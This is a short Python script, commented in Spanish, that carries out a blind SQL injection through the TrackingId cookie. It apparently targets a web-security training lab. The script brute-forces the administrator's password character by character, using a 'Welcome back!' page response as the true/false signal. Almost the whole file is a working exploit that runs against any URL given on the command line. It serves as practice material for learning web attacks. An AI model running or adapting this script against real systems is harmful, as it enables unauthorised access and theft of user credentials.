#!/usr/bin/env python3
import sys
import requests
from bs4 import BeautifulSoup
import re
import urllib3
import string
urllib3.disable_warnings()
cl="\r\033[K"
gyC="\033[0;37m\033[1m"
yC="\033[0;33m\033[1m"
bC="\033[0;34m\033[1m"
gC="\033[0;32m\033[1m"
rC="\033[0;31m\033[1m"
eC="\033[0m"
def findChar(url,cookies,longitud):
    pazz=""
    char_template="{trackingId}'AND+(SELECT+SUBSTRING(password,{pos},1)+FROM+users+WHERE+username='administrator')='{char}'--"
    trackingId=cookies["TrackingId"]
    for pos in range(1,longitud+1):
        for char in string.ascii_letters+string.digits:
            trackingIdInyeccion=char_template.format(trackingId=trackingId,pos=pos,char=char)
            cookies["TrackingId"]=trackingIdInyeccion
            print(f"{cl}{yC}[+] {gyC}Realizando inyeccion: {gC}{trackingIdInyeccion}{eC}",end="",flush=True)
            response=requests.get(url=url,verify=False,cookies=cookies)
            soup = BeautifulSoup(response.text,"lxml")
            nodo = soup.find(string="Welcome back!")
            if nodo :
                print(f" {gyC}Caracter{yC}[{pos}]{gyC} encontrado: {rC}{char}{eC}")
                pazz+=char
                break
    print(f"{yC}[+] Las password para el usuario administrator es: {rC}{pazz}{eC}")
def main():
    url=sys.argv[1].strip("/") 
    #Obtencion de cookies
    response = requests.get(
            url=url,
            verify=False,
            proxies={"https":"http://127.0.0.1:8080"}
    )
    findChar(url,response.cookies.get_dict(),20)
main()


